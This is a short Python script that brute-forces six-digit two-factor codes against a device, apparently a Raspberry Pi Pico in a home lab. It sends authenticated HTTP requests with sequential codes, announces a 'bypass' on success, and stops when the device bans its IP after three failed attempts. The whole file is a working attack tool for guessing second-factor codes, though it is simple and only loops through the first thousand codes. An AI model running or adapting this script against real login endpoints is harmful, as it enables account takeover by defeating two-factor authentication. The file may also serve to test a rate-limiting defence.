import urllib.request
import urllib.error
import base64
import time
import sys

target = input("Target Pico IP: ")
user = input("Username: ")
pw = input("Password: ")

# Generate the basic auth header
auth_header = base64.b64encode(f"{user}:{pw}".encode()).decode()
headers = {"Authorization": f"Basic {auth_header}", "Connection": "close"}

print(f"\n[*] Target Locked: {target}")
print("[*] Credentials accepted. Commencing 2FA Brute-Force...")

for i in range(1000):
    code = f"{i:06d}" # Formats as 000000, 000001, etc.
    sys.stdout.write(f"\r[*] Guessing 2FA Code: {code} ")
    sys.stdout.flush()
    
    # Send the code directly to the Pico
    url = f"http://{target}/?code={code}"
    
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=2) as res:
            if res.status == 200:
                print(f"\n\n[+] BYPASS SUCCESS! The 2FA code is: {code}")
                break
    except urllib.error.HTTPError as e:
        if e.code == 403:
            body = e.read().decode()
            if "BLOCKED" in body:
                print(f"\n\n[!!!] ATTACK HALTED: IP BANNED BY PICO.")
                print("[!] The firewall detected 3 failed attempts and locked us out.")
                break
            # If it's just "Wrong Code", the loop continues
    time.sleep(0.1)